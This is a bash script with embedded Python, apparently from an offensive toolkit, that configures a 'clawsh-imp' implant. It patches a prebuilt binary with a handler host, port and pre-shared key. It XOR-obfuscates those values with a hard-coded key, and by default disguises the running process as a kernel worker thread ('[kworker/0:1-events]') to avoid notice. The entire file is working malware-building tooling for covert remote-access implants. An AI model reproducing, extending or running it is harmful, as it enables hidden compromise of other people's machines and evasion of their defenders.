#!/bin/bash
# builder.sh — Implant configurator for clawsh-imp
#
# Patches a pre-built template binary with operator-supplied configuration.
# No Rust toolchain or source code required on the operator's machine.
#
# The template binary embeds a 256-byte patchable config blob marked by
# the magic "CLAWCFG1". This script locates and overwrites that blob.
#
# Usage:
#   ./builder.sh --host 10.0.0.1 --port 443 --psk "my-secret-key"
#   ./builder.sh --host 10.0.0.1 --port 443 --psk "my-secret" --tls
#   ./builder.sh --host 10.0.0.1 --port 443 --psk "my-secret" --disguise "[kworker/0:2]"
#   ./builder.sh --host 10.0.0.1 --port 443 --psk "my-secret" --output /tmp/payload
#   ./builder.sh --host 10.0.0.1 --port 443 --psk "my-secret" --template /path/to/template
#
# To build a fresh template binary from source (requires Rust toolchain):
#   ./builder.sh --build-template

set -euo pipefail

# ── Defaults ──────────────────────────────────────────────────────────────────
DISGUISE="[kworker/0:1-events]"
OUTPUT="./implant"
HOST=""
PORT=""
PSK=""
TLS="false"
TEMPLATE="./clawsh-imp-template"
BUILD_TEMPLATE=false

usage() {
    cat <<EOF
Usage: $0 --host HOST --port PORT --psk PSK [OPTIONS]

Required:
  --host HOST         Handler IP or hostname
  --port PORT         Handler port (1-65535)
  --psk  PSK          Pre-shared key passphrase

Optional:
  --tls               Enable TLS transport (default: off)
  --disguise NAME     Process disguise name (default: [kworker/0:1-events])
  --output PATH       Output binary path (default: ./implant)
  --template PATH     Template binary to patch (default: ./clawsh-imp-template)

Developer:
  --build-template    Build a new template binary from source (requires Rust)
EOF
    exit 1
}

# ── Argument parsing ──────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --host)           HOST="$2";     shift 2 ;;
        --port)           PORT="$2";     shift 2 ;;
        --psk)            PSK="$2";      shift 2 ;;
        --tls)            TLS="true";    shift 1 ;;
        --disguise)       DISGUISE="$2"; shift 2 ;;
        --output)         OUTPUT="$2";   shift 2 ;;
        --template)       TEMPLATE="$2"; shift 2 ;;
        --build-template) BUILD_TEMPLATE=true; shift 1 ;;
        -h|--help)        usage ;;
        *)                echo "Unknown option: $1"; usage ;;
    esac
done

# ── Build template mode ───────────────────────────────────────────────────────
if [[ "$BUILD_TEMPLATE" == "true" ]]; then
    echo "=== Building template binary from source ==="
    cargo build -p clawsh-imp --release --quiet
    cp target/release/clawsh-imp "$TEMPLATE"
    SIZE=$(stat --printf="%s" "$TEMPLATE" 2>/dev/null || stat -f "%z" "$TEMPLATE")
    HASH=$(sha256sum "$TEMPLATE" 2>/dev/null | cut -d' ' -f1 || shasum -a 256 "$TEMPLATE" | cut -d' ' -f1)
    echo "[+] Template built"
    echo "    Path:   $TEMPLATE"
    echo "    Size:   $SIZE bytes"
    echo "    SHA256: $HASH"
    exit 0
fi

# ── Validate required parameters ─────────────────────────────────────────────
[[ -z "$HOST" ]] && { echo "Error: --host is required"; usage; }
[[ -z "$PORT" ]] && { echo "Error: --port is required"; usage; }
[[ -z "$PSK"  ]] && { echo "Error: --psk is required";  usage; }

if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [[ "$PORT" -lt 1 ]] || [[ "$PORT" -gt 65535 ]]; then
    echo "Error: --port must be between 1 and 65535"; exit 1
fi

[[ ! -f "$TEMPLATE" ]] && { echo "Error: template binary not found: $TEMPLATE"; exit 1; }

# Validate field lengths
[[ ${#HOST}     -gt 63 ]] && { echo "Error: --host too long (max 63 chars)"; exit 1; }
[[ ${#PSK}      -gt 63 ]] && { echo "Error: --psk too long (max 63 chars)"; exit 1; }
[[ ${#DISGUISE} -gt 63 ]] && { echo "Error: --disguise too long (max 63 chars)"; exit 1; }

echo "=== clawsh-imp payload configurator ==="
echo "  Host:     $HOST"
echo "  Port:     $PORT"
echo "  PSK:      ${PSK:0:4}..."
echo "  TLS:      $TLS"
echo "  Disguise: $DISGUISE"
echo "  Template: $TEMPLATE"
echo "  Output:   $OUTPUT"
echo ""

# ── Patch template binary ─────────────────────────────────────────────────────
echo "[*] Patching binary..."

python3 - "$HOST" "$PORT" "$PSK" "$TLS" "$DISGUISE" "$TEMPLATE" "$OUTPUT" <<'PYEOF'
import sys, struct, shutil, os

host, port_s, psk, tls_s, disguise, src, dst = sys.argv[1:]

MAGIC = b"CLAWCFG1"

# Must match PATCH_KEY in build.rs and main.rs
PATCH_KEY = bytes([
    0x4B, 0x1F, 0xA2, 0x7C, 0xE3, 0x85, 0x29, 0xD6,
    0x5E, 0x91, 0x4A, 0xB7, 0x3C, 0xF8, 0x60, 0x2D,
    0x9B, 0x13, 0xE7, 0x46, 0x5C, 0x28, 0xA0, 0xF4,
    0x71, 0xBE, 0x08, 0x93, 0xD2, 0x6F, 0xC1, 0x47,
])

def xor_pad(s: str, size: int) -> bytes:
    raw = s.encode('utf-8')
    # Build null-padded plaintext, then XOR with PATCH_KEY
    padded = raw[:size] + b'\x00' * (size - len(raw))
    return bytes(b ^ PATCH_KEY[i % len(PATCH_KEY)] for i, b in enumerate(padded[:size]))

with open(src, 'rb') as f:
    data = bytearray(f.read())

pos = data.find(MAGIC)
if pos < 0:
    print("ERROR: Config magic 'CLAWCFG1' not found in template binary", file=sys.stderr)
    print("       Is this a valid clawsh-imp template?", file=sys.stderr)
    sys.exit(1)

# Verify version byte
if data[pos + 8] != 0x01:
    print(f"ERROR: Unsupported config version: {data[pos+8]:#x}", file=sys.stderr)
    sys.exit(1)

# Patch fields at known offsets relative to magic
data[pos + 9]       = 0x01 if tls_s == 'true' else 0x00      # flags (TLS)
data[pos+10:pos+12] = struct.pack('<H', int(port_s))           # port u16 LE
data[pos+12:pos+76] = xor_pad(host, 64)                        # host
data[pos+76:pos+140] = xor_pad(psk, 64)                        # psk
data[pos+140:pos+204] = xor_pad(disguise, 64)                  # disguise
data[pos + 255]     = 0xFF                                     # active flag

# Write to output, preserving executable permission
shutil.copy(src, dst)
with open(dst, 'wb') as f:
    f.write(data)
os.chmod(dst, 0o755)

print(f"  Magic found at offset: {pos:#010x}")
PYEOF

# ── Report ────────────────────────────────────────────────────────────────────
SIZE=$(stat --printf="%s" "$OUTPUT" 2>/dev/null || stat -f "%z" "$OUTPUT")
HASH=$(sha256sum "$OUTPUT" 2>/dev/null | cut -d' ' -f1 || shasum -a 256 "$OUTPUT" | cut -d' ' -f1)

echo ""
echo "[+] Done"
echo "    Path:   $OUTPUT"
echo "    Size:   $SIZE bytes"
echo "    SHA256: $HASH"
echo "    Time:   $(date -u +%Y-%m-%dT%H:%M:%SZ)"
